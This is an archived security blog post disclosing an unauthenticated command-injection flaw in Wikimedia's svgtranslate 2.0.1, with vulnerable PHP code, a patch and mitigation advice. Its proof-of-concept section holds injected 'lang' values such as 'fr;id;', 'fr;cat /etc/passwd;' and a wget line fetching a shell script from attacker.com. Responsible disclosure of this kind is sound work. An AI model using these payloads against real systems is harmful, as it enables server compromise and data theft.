---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-05-23_wikimediasvgtranslate-201-remote-code-execution.md
original_filename: 2024-05-23_wikimediasvgtranslate-201-remote-code-execution.md
title: Wikimedia/svgtranslate 2.0.1 Remote Code Execution
category: documents
detected_topics:
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: a76c57fd68e3800ebc4dd465309f463bd1ade61ccdccd5d24fb00d5e4c9446a4
text_sha256: e504ab3532b0d77efd1592a672bcec86bcaea430f0ed5c46860b9f697abb0b04
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Wikimedia/svgtranslate 2.0.1 Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-05-23_wikimediasvgtranslate-201-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `a76c57fd68e3800ebc4dd465309f463bd1ade61ccdccd5d24fb00d5e4c9446a4`
- Text SHA256: `e504ab3532b0d77efd1592a672bcec86bcaea430f0ed5c46860b9f697abb0b04`


## Content

---
title: "Wikimedia/svgtranslate 2.0.1 Remote Code Execution"
page_title: "Wikimedia/svgtranslate 2.0.1 Remote Code Execution - Chocapikk's Cybersecurity Blog"
url: "https://chocapikk.com/posts/2024/svgtranslate/"
final_url: "https://chocapikk.com/posts/2024/svgtranslate/"
authors: ["Valentin Lobstein (@Chocapikk_)"]
programs: ["Wikimedia (SVGTranslate)"]
bugs: ["RCE", "OS command injection", "Security code review"]
publication_date: "2024-05-23"
added_date: "2024-07-01"
source: "pentester.land/writeups.json"
original_index: 279
---

# Wikimedia/svgtranslate 2.0.1 Remote Code Execution

Valentin Lobstein / May 23, 2024

[ CVE ](/tags/cve/)

![Wikimedia/svgtranslate 2.0.1 Remote Code Execution](/img/svgtranslate/wikimedia.png)

Table of Contents 

  * Introduction 
  * System Overview 
  * Vulnerability Summary 
  * Vulnerability Analysis 
  * Vulnerability Description 
  * Entry Point 
  * Renderer Vulnerability 
  * Proof of Concept 
  * Exploitation 
  * Timeline 
  * Patch Details 
  * Response Time 
  * Impact & Mitigation 
  * Affected Versions 
  * Mitigation 
  * Mitigation Recommendations 
  * Security Best Practices 
  * Code Fix Example 
  * Acknowledgments 

## Introduction

**SVGTranslate** , developed by **Wikimedia** , converts SVG files into PNG images while allowing for language-based text substitutions within the SVG content. This PHP backend application is structured with functionality managed through `ApiController.php` and `Renderer.php`.

**Key Information:**

  * **Affected Software** : Wikimedia/svgtranslate
  * **Vulnerability Type** : Remote Command Execution (RCE)
  * **CVE ID** : Not assigned (as of article publication)
  * **Severity** : Critical
  * **Authentication** : Not required (Unauthenticated)
  * **Impact** : Full server compromise possible

### System Overview

**SVGTranslate** is a PHP backend application that processes SVG files and generates PNG images with language-specific text substitutions.

**Key Components:**

  * **API Controller** : `/src/Controller/ApiController.php` \- Handles API requests
  * **Rendering Service** : `/src/Service/Renderer.php` \- Processes SVG to PNG conversion
  * **Repository** : [wikimedia/svgtranslate](https://github.com/wikimedia/svgtranslate) on GitHub

## Vulnerability Summary

Field| Details  
---|---  
**CVE ID**|  Not assigned (as of article publication)  
**Affected Component**| `/src/Service/Renderer.php`  
**Type**|  Remote Command Execution (RCE)  
**Authentication**|  Not required (Unauthenticated)  
**Attack Vector**| `lang` parameter in URL path  
**Impact**|  Arbitrary command execution on the server  
**Affected Versions**|  2.0.1 and below  
**Fixed Version**|  2.0.2 (released May 23, 2024)  
  
**Key Statistics:**

  * **Vulnerability Exposure** : Since February 2024
  * **Response Time** : Fixed within 1 day of report
  * **Severity** : Critical - allows full server compromise

## Vulnerability Analysis

### Vulnerability Description

The application is vulnerable to **unauthenticated remote code execution (RCE)** due to improper handling of the `lang` parameter in the PNG generation process. The vulnerability arises from how shell commands are constructed and executed in the rendering service without proper sanitization.

### Entry Point

The API endpoint processes file names and language parameters to serve PNG files, **without adequate validation** of the `lang` parameter:

**Vulnerable API Endpoint:**
  
  
  /**
  * Serve a PNG rendering of the given SVG in the given language.
  * @Route("/api/file/{filename}/{lang}.png", name="api_file", methods="GET")
  * @param string $filename
  * @param string $lang
  * @return Response
  */
  public function getFile(string $filename, string $lang): Response
  {
  $filename = Title::normalize($filename);
  $content = $this->svgRenderer->render($this->cache->getPath($filename), $lang);  // ⚠️ Unsanitized lang parameter
  return new Response($content, 200, ['Content-Type' => 'image/png', 'X-File-Hash' => sha1($content)]);
  }

**Impact:**

The `lang` parameter from the URL is directly passed to the renderer without validation, allowing attackers to inject arbitrary commands.

### Renderer Vulnerability

In `Renderer.php`, the `lang` parameter is **unsafely included in a shell command** , allowing command injection:

**Vulnerable Code:**
  
  
  /**
  * Render a SVG file to PNG.
  * @param string $file Full filesystem path to the SVG file to render.
  * @param string $lang Language code for rendering.
  * @param string $outFile File path for the output PNG.
  * @throws ProcessFailedException If conversion fails.
  * @return string The PNG image contents.
  */
  public function render(string $file, string $lang, ?string $outFile = null) : string
  {
  $command = $this->rsvgCommand.' "$SVG"';
  if ('fallback' !== $lang) {
  $command .= " --accept-language=$lang";  // ⚠️ Direct injection without sanitization
  }
  if ($outFile) {
  $command .= ' > "$PNG"';
  }
  $process = Process::fromShellCommandline($command);
  $process->mustRun(null, ['SVG' => $file, 'PNG' => $outFile]);
  return $process->getOutput();
  }

**Impact:**

The `lang` parameter is directly concatenated into the shell command without proper escaping or validation. This allows attackers to:

  * Inject arbitrary shell commands
  * Execute commands on the server
  * Gain full control over the server
  * Access sensitive data and system resources

## Proof of Concept

### Exploitation

The vulnerability was tested directly on the Wikimedia instance, demonstrating unauthorized command execution as evidenced by the system user information in the server response.

**Attack Payload:**

The vulnerability can be exploited by injecting a command separator (`;`) followed by arbitrary commands in the `lang` parameter:
  
  
  GET /api/file/SI_base_unit1.svg/fr;id;.png HTTP/2
  Host: svgtranslate.toolforge.org

**Explanation:**

  * The `lang` parameter is set to `fr;id;`
  * The semicolon (`;`) acts as a command separator in shell
  * The `id` command is executed, revealing system user information
  * This demonstrates the ability to execute arbitrary commands on the server

**Example Commands:**

Attackers can execute various commands:

  * `fr;id;` \- Display user and group IDs
  * `fr;whoami;` \- Display current username
  * `fr;cat /etc/passwd;` \- Read system files
  * `fr;wget http://attacker.com/shell.sh -O /tmp/shell.sh;` \- Download malicious files

![PoC](/img/svgtranslate/poc.png)

PoC

## Timeline

Date| Event  
---|---  
**February 2024**|  Vulnerability introduced (exposure period begins)  
**May 22, 2024**|  Vulnerability reported to Wikimedia  
**May 23, 2024**|  Vulnerability patched  
**May 23, 2024**|  Version 2.0.2 released with fix  
  
### Patch Details

  * **Patch Commit** : [cc0aef7b2c6ba7205329b93fb95f0bdceaa89d1c](https://github.com/wikimedia/svgtranslate/commit/cc0aef7b2c6ba7205329b93fb95f0bdceaa89d1c)
  * **Fixed Version** : 2.0.2
  * **Response Time** : Fixed within 1 day of report

### Response Time

The Wikimedia development team demonstrated exceptional responsiveness, fixing the critical vulnerability within **1 day** of the report. This rapid response significantly reduced the window of exposure for affected systems.

## Impact & Mitigation

### Affected Versions

  * **SVGTranslate versions** : 2.0.1 and below
  * **Fixed version** : 2.0.2 (released May 23, 2024)
  * **Component affected** : `/src/Service/Renderer.php`
  * **Exposure period** : Since February 2024

### Mitigation

Users are strongly advised to:

  1. **Update immediately** to SVGTranslate version 2.0.2 or later
  2. **Review** any suspicious activity on affected systems
  3. **Monitor** server logs for exploitation attempts
  4. **Apply** security best practices, including input validation and command sanitization

## Mitigation Recommendations

### Security Best Practices

To prevent similar vulnerabilities in the future, implement the following security measures:

  1. **Input Validation** :

  * Implement strict validation for all input parameters
  * Use whitelist approach for language codes
  * Validate against expected patterns before processing
  2. **Secure Command Execution** :

  * Use array parameters for command execution to ensure separation between commands and arguments
  * Avoid shell command construction with string concatenation
  * Use `escapeshellarg()` or similar functions for all user inputs
  3. **Security Audit and Testing** :

  * Conduct thorough security reviews
  * Perform penetration testing regularly
  * Implement automated security scanning in CI/CD pipelines

### Code Fix Example

**Before (vulnerable):**
  
  
  $command .= " --accept-language=$lang";  // ⚠️ Direct injection

**After (fixed):**
  
  
  $lang = escapeshellarg($lang);  // Sanitize input
  $command .= " --accept-language=$lang";

Or better yet, use array-based command execution:
  
  
  $process = new Process([
  $this->rsvgCommand,
  '--accept-language', $lang,  // Safe: array prevents injection
  $file
  ]);

## Acknowledgments

I sincerely thank the **Wikimedia team** for their:

  * **Quick response** to the vulnerability report
  * **Rapid patch release** (within 1 day of discovery)
  * **Professional handling** of the responsible disclosure process
  * **Commitment to security** and maintaining high-quality open-source tools

Big thanks to everyone at Wikimedia for their hard work on so many helpful tools. Their quick teamwork in fixing this vulnerability really shows their commitment to keeping things secure and running smoothly. Your efforts are greatly appreciated!

This incident highlights the importance of responsible vulnerability disclosure and the value of open communication between security researchers and software maintainers.
